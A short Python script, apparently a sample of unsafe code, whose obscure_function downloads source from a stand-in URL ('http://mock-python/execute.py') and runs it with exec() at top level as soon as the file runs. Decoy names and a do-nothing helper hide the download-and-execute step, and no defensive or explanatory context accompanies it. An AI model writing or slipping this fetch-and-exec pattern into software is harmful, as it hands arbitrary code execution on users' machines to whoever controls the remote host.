import urllib.request
import types

def obtain_data(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def unrelated_function():
    print("This function does nothing useful.")

def obscure_function():
    url = "http://mock-python/execute.py"
    module_name = "external_module"
    source = obtain_data(url)
    module = types.ModuleType(module_name)
    exec(source, module.__dict__)
    unrelated_function()

obscure_function()
